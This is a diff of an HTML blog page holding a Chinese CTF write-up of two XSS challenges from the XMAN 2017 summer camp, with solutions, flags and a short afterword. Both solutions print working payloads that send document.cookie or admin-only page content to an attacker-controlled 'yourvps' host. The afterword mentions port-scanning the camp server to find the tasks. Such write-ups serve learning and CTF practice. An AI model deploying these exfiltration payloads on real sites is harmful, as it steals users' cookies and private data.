@@ -96,7 +96,8 @@
 <meta property="og:site_name" content="Chybeta">
 <meta property="og:description" content="xss">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/9.png?raw=true">
-<meta property="og:updated_time" content="2017-08-22T13:19:45.884Z">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/12.png?raw=true">
+<meta property="og:updated_time" content="2017-08-22T13:50:23.910Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XMAN夏令营-2017-XSS-writeup">
 <meta name="twitter:description" content="xss">
@@ -410,13 +411,18 @@
       
         <p>xss<br><a id="more"></a></p>
 <h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:33323/</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看csp头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;&quot;</div></pre></td></tr></table></figure></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>查看csp头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;&quot;</div></pre></td></tr></table></figure></p>
 <p>这里给出一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">    var head = document.getElementsByTagName(&quot;head&quot;)[0]</div><div class="line">    var n0t = document.createElement(&quot;link&quot;);</div><div class="line">    n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</div><div class="line">    n0t.setAttribute(&quot;href&quot;, &quot;http://yourvps/?&quot; + document.cookie);</div><div class="line">    head.appendChild(n0t);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/9.png?raw=true" alt=""></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:43424</div></pre></td></tr></table></figure>
-<h1 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h1><p>没有csp头。但没办法直接得到cookie。</p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;BeVEn_CSP_you_G37_mY_C00K1e&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:43425</div></pre></td></tr></table></figure>
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>没有csp头。但没办法直接得到cookie。</p>
 <p>另外有一个flag.php，访问后如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">only admin can see the flag!</div></pre></td></tr></table></figure></p>
-<p>有点像0ctf2017的题目.</p>
+<p>我们先控制admin访问flag.php，之后再发送数据到我们vps上。</p>
+<p>payload：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xhr.open(<span class="string">"GET"</span>, <span class="string">"http://202.112.51.217:43425/flag.php"</span>, <span class="literal">false</span>);</div><div class="line">  xhr.send();</div><div class="line">  a=xhr.responseText;</div><div class="line">  location.href=<span class="string">"http://yourvps/?a="</span>+<span class="built_in">escape</span>(a);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/12.png?raw=true" alt=""></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;OH_Y0u_G37_mY_secreT_F14G!&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这些夏令营的题目是看到了一份wp，然后直接用nmap把ip的所有端口都扫了一遍：），然后扫出了一些web题：）</p>
 
       
     </div>
@@ -694,7 +700,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Task1"><span class="nav-number">1.</span> <span class="nav-text">Task1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task2"><span class="nav-number">3.</span> <span class="nav-text">Task2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solution-1"><span class="nav-number">4.</span> <span class="nav-text">Solution</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Task1"><span class="nav-number">1.</span> <span class="nav-text">Task1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-number">1.1.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Task2"><span class="nav-number">2.</span> <span class="nav-text">Task2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution-1"><span class="nav-number">2.1.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后记"><span class="nav-number">3.</span> <span class="nav-text">后记</span></a></li></ol></div>
             
 
           </div>
